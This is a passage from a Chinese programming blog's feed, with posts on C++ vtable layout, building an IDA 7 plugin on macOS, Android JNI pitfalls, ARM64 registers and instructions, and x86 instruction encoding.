     ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>ARM64基础知识整理</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64基础知识整理/ARM64基础知识整理/</id>
    <published>2017-10-21T10:07:00.000Z</published>
    <updated>2019-03-08T07:07:58.360Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM64基础知识整理"><a href="#ARM64基础知识整理" class="headerlink" title="ARM64基础知识整理"></a>ARM64基础知识整理</h3><h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><h5 id="参数寄存器-X0-X7"><a href="#参数寄存器-X0-X7" class="headerlink" title="参数寄存器 (X0-X7)"></a>参数寄存器 (X0-X7)</h5><p>参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。</p><h5 id="其他特殊寄存器"><a href="#其他特殊寄存器" class="headerlink" title="其他特殊寄存器"></a>其他特殊寄存器</h5><table><thead><tr><th style="text-align:center">X29(FP)</th><th style="text-align:center">栈帧寄存器  类比x64中rbp</th></tr></thead><tbody><tr><td style="text-align:center">X30(LR)</td><td style="text-align:center">链接寄存器，保存函数返回地址，x64该地址保存在栈中</td></tr><tr><td style="text-align:center">SP</td><td style="text-align:center">栈顶寄存器，类比x64中</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">指向下一条指令</td></tr><tr><td style="text-align:center">寄存器</td><td style="text-align:center">描述</td></tr><tr><td style="text-align:center">CPSR</td><td style="text-align:center">状态寄存器</td></tr></tbody></table><h4 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h4><ul><li><code>mov</code></li></ul><pre><code class="assembly">  mov x0, x1; copies x1 into x0  mov x1, 0x4141; loads the value 0x4141 in x1</code></pre><ul><li><code>str/ldr</code></li></ul><pre><code class="assembly">str x0, [x29]; store x0 at the address in x29ldr x0, [x29]; load the value from the address in x29 into x0</code></pre><ul><li><code>stp/ldp</code></li></ul><pre><code class="assembly">stp x29, x30, [sp]; store x29 at sp and x30 at sp+8</code></pre><ul><li><code>b/br</code></li></ul><pre><code class="assembly"> br x0; jump to the address stored in x0</code></pre><ul><li><code>ret</code></li></ul><pre><code>Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there.</code></pre><h4 id="Indexing-modes"><a href="#Indexing-modes" class="headerlink" title="Indexing modes"></a>Indexing modes</h4><ul><li>Immediate offset : <code>[base, #offset]</code> - Index an offset directly and don’t mess with anything else</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]; load x0 from sp+0x10</code></pre><ul><li>Pre-indexed : <code>[base, #offset]!</code> - Almost the same as above, except that base+offset is written back into base.</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10</code></pre><ul><li>Post-indexed : <code>[base], #offset</code> - Use the base directly and then write base+offset back into the base</li></ul><pre><code class="assembly">ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10</code></pre><h4 id="函数调用demo分析"><a href="#函数调用demo分析" class="headerlink" title="函数调用demo分析"></a>函数调用demo分析</h4><pre><code class="assembly">__text:000000010004F0D4                 SUB             SP, SP, #0x70__text:000000010004F0D8                 STP             X24, X23, [SP,#0x60+var_30]__text:000000010004F0DC                 STP             X22, X21, [SP,#0x60+var_20]__text:000000010004F0E0                 STP             X20, X19, [SP,#0x60+var_10]__text:000000010004F0E4                 STP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F0E8                 ADD             X29, SP, #0x60__text:000000010004F0EC                 MOV             X19, X0__text:000000010004F0F0                 ADRP            X8, #___stack_chk_guard_ptr@PAGE__text:000000010004F0F4                 LDR             X8, [X8,#___stack_chk_guard_ptr@PAGEOFF]__text:000000010004F0F8                 LDR             X8, [X8]__text:000000010004F0FC                 STR             X8, [SP,#0x60+var_38]__text:000000010004F100                 ADRP            X8, #classRef_Fabric@PAGE__text:000000010004F104                 LDR             X20, [X8,#classRef_Fabric@PAGEOFF]__text:000000010004F108                 NOP__text:000000010004F10C                 LDR             X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void *__text:000000010004F110                 ADRP            X8, #selRef_class@PAGE__text:000000010004F114                 LDR             X1, [X8,#selRef_class@PAGEOFF] ; char *__text:000000010004F118                 BL              _objc_msgSend...__text:000000010004F2F4                 LDP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F2F8                 LDP             X20, X19, [SP,#0x60+var_10]__text:000000010004F2FC                 LDP             X22, X21, [SP,#0x60+var_20]__text:000000010004F300                 LDP             X24, X23, [SP,#0x60+var_30]__text:000000010004F304                 ADD             SP, SP, #0x70__text:000000010004F308                 RET</code></pre><table><thead><tr><th style="text-align:center">地址</th><th style="text-align:center">栈值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">sp=sp-0x70</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x60</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x50</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x40</td><td style="text-align:center">X24/X23</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x30</td><td style="text-align:center">X22/X21</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x20</td><td style="text-align:center">X20/X19</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">X29 –&gt; sp-0x10</td><td style="text-align:center">X29/X30</td><td style="text-align:center">保存前栈基址和返回地址</td></tr><tr><td style="text-align:center">sp=sp</td><td style="text-align:center"></td><td style="text-align:center">调用前的栈顶地址</td></tr></tbody></table><h4 id="Arm32"><a href="#Arm32" class="headerlink" title="Arm32"></a>Arm32</h4><p><img src="https://azeria-labs.com/downloads/cheatsheetv1.2-1920x1080.png" alt="arm32"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.jianshu.com/p/2f4a5f74ac7a" target="_blank" rel="external">https://www.jianshu.com/p/2f4a5f74ac7a</a></li><li><a href="https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start" target="_blank" rel="external">https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start</a></li><li><a href="https://blog.perfect.blue/ROPing-on-Aarch64" target="_blank" rel="external">https://blog.perfect.blue/ROPing-on-Aarch64</a></li><li><a href="https://azeria-labs.com/assembly-basics-cheatsheet/" target="_blank" rel="external">https://azeria-labs.com/assembly-basics-cheatsheet/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM64基础知识整理&quot;&gt;&lt;a href=&quot;#ARM64基础知识整理&quot; class=&quot;headerlink&quot; title=&quot;ARM64基础知识整理&quot;&gt;&lt;/a&gt;ARM64基础知识整理&lt;/h3&gt;&lt;h4 id=&quot;Register&quot;&gt;&lt;a href=&quot;#Register&quot;
      
    
    </summary>
    
      <category term="assembly" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/assembly/"/>
    
    
      <category term="ARM64" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"/>
    
  </entry>
  
  <entry>
    <title>X86指令编码笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86指令编码笔记/X86指令编码笔记/</id>
    <published>2017-10-11T03:46:13.000Z</published>
    <updated>2019-02-21T10:03:24.082Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。</p></blockquote><h3 id="x86指令编码格式"><a href="#x86指令编码格式" class="headerlink" title="x86指令编码格式"></a>x86指令编码格式</h3><p>很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。</p><p>x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了<code>Intel 64</code>和<code>IA-32</code>架构下的指令格式，当然，这两种架构所采用的都是x86指令编码：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.png?raw=true" alt="指令编码格式"></p><p>从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。</p><h3 id="指令prefix"><a href="#指令prefix" class="headerlink" title="指令prefix"></a>指令prefix</h3><p>prefix简单的说来就是调整内存操作数属性，增强指令的作用等。</p><ul><li><p><code>lock</code> 和 <code>repeat</code></p><p>其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。</p></li><li><p><code>operand-size override</code> （<strong>66H </strong>— 改变默认操作数大小）</p><p>这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/operand_size_override.png?raw=true" alt="operand_size_override"></p></li><li><p><code>address-size override</code> （<strong>67H</strong> — 改变默认操作数地址大小）</p><p>这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/address_override.png?raw=true" alt="address_override"></p></li><li><p><code>segment override</code>，<code>branch hints</code> 和 <code>bound</code></p><p>其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。</p><p>​</p><p>| 2E          | 3E          | 26          | 64          | 65          | 36          |<br>| ———– | ———– | ———– | ———– | ———– | ———– |<br>| CS register | DS register | ES register | FS register | GS register | SS register |</p></li></ul><h4 id="REX-prefix—开启-64-位计算的基石"><a href="#REX-prefix—开启-64-位计算的基石" class="headerlink" title="REX prefix—开启 64 位计算的基石"></a>REX prefix—开启 64 位计算的基石</h4><p>REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个）</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>W</td><td>R</td><td>X</td><td>B</td></tr></tbody></table><ul><li>W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size</li><li>R: 用来扩展 ModRM.reg 域</li><li>X: 用来扩展 SIB.index 域</li><li>B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg</li></ul><h5 id="寄存器编码表"><a href="#寄存器编码表" class="headerlink" title="寄存器编码表"></a>寄存器编码表</h5><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/register_table.png?raw=true" alt="register_table"></p><p>下面来分析这条指令：</p><p><code>mov eax,ebx</code></p><p>正常编码为：<code>89 d8</code>  下面看看在不同的<code>REX.W</code>和<code>66H prefix</code>下的不同：</p><ul><li><p><code>48 89 d8</code>——————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 48 89 d8</code>—————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 40 89 d8</code>—————&gt; <code>mov ax, bx</code></p><p>​</p></li></ul><p>第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，<strong>REX.W = 1</strong></p><p>第 2 条指令编码加上了 <strong>66H prefix</strong> 同时还有 REX prefix（<strong>REX.W = 1</strong>），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？<br>实际上，很简单！<strong>48H 位于 66H 后面，66H 将被覆盖！</strong>也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 <strong>operand size 是 64 位</strong>的。</p><p>第 3 条指令编码也同样使用了 <strong>66H prefix </strong>和 <strong>REX prefix</strong>，但是 <strong>REX.W = 0</strong> 意味着不改变原来的 operand size！<br>在这种情况下，<strong>REX prefix 不会与 66H prefix 产生冲突</strong>，最终的作用于 66H prefix，因此 <strong>operand size 是 16 位</strong>的。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。</p><p>一个opcode可以由一个byte组成，我们称之为<code>1-byte opcode</code>，当然，与之对应的，就有<code>2-bytes opcode</code>和<code>3-bytes opcode</code>。其中，后两者一般会有一个被称为<code>escape opcode</code>的byte进行引导，该byte的数值是<code>0FH</code>。所以，一般情况下，<code>2-bytes opcode</code>就是<code>0FH</code>后面再加一个byte，而<code>3-bytes opcode</code>就是<code>0FH</code>后面再加两个bytes。</p><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><p>ModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。</p><p>由一个byte组成，其格式如下：</p><table><thead><tr><th>7 6</th><th>5 4 3</th><th>2 1 0</th></tr></thead><tbody><tr><td>mod</td><td>reg</td><td>R/M</td></tr></tbody></table><p><strong>1、mod：寻址模式。</strong><br>　　2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。</p><ul><li>mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式：</li></ul><ul><li>mod = 00，定义 [register] 间接寻址，无displacement值。</li><li>mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。</li><li>mod = 10，定义 [register + disp32]，有32位displacement偏移值。</li></ul><p><strong>2、reg：寄存器ID值</strong><br>　　3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。</p><p>reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。</p><p><strong>3、r/m：意即register / memory。</strong></p><p>​     提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。</p><blockquote><p>注意:</p><p>(1) 如果像这条指令：mov eax, 